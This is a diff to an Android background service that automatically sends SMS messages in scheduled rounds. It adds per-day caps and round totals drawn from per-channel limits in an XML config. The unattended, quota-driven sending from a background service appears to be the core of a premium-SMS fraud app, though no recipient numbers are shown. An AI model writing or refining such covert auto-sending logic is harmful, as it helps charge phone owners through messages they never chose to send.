@@ -229,6 +229,9 @@ public class BgService extends Service {
 //                sm.setSMSSendDelay(false_retry_time);
 //                SettingManager.getInstance(this).startAutoSendMessage(System.currentTimeMillis(), false_retry_time);
             }
+            if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
+                mSM.setSMSRoundTotalSnedCount(0);
+            }
         } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS_ROUND) == true) {
             mSM.log("receive the action = " + intent.getAction());
             oneRoundSMSSend();
@@ -309,19 +312,27 @@ public class BgService extends Service {
         if (sm.mXMLHandler != null) {
             String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
             if (monthCount != null) {
-                int sendTotlaCount = Integer.valueOf(monthCount);
-                int hasSend = sm.getSMSSendCount();
-                if (hasSend < sendTotlaCount) {
+                String dayCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_DAY);
+                int sendTotlaCount = Integer.valueOf(monthCount) - sm.getSMSRoundTotalSend();
+                if (dayCount != null && dayCount.equals("") == false
+                        && sendTotlaCount >= 0) {
+                    sendTotlaCount = (sendTotlaCount > Integer.valueOf(dayCount))
+                                          ? Integer.valueOf(dayCount) 
+                                          : sendTotlaCount;
+                }
+                int todayHasSend = sm.getTodaySMSSendCount();
+                if (todayHasSend < sendTotlaCount) {
                     autoSendSMS(BgService.this);
-                    sm.setSMSSendCount(hasSend + 1);
-                    LOGD("this round has send sms count = " + (hasSend + 1));
-                    sm.log(TAG, "this round has send sms count = " + (hasSend + 1));
+                    sm.setTodaySMSSendCount(todayHasSend + 1);
+                    LOGD("this round has send sms count = " + (todayHasSend + 1));
+                    sm.log(TAG, "this round has send sms count = " + (todayHasSend + 1));
                 } else {
                     sm.log(TAG, "cancel this round the sms auto send, because the send job done");
-                    sm.setSMSSendCount(0);
+                    sm.setSMSRoundTotalSnedCount(sm.getSMSRoundTotalSend() + sendTotlaCount);
+                    sm.setTodaySMSSendCount(0);
                     sm.cancelOneRoundSMSSend();
                     sm.setLastSMSTime(System.currentTimeMillis());
-                    sm.setSMSSendDelay(SettingManager.SMS_DEFAULT_DELAY_TIME);
+                    sm.setSMSSendDelay(SettingManager.SMS_CHECK_ROUND_DELAY);
                     long sms_delay_time = sm.getSMSSendDelay();
                     sm.startAutoSendMessage(0, sms_delay_time);
                 }
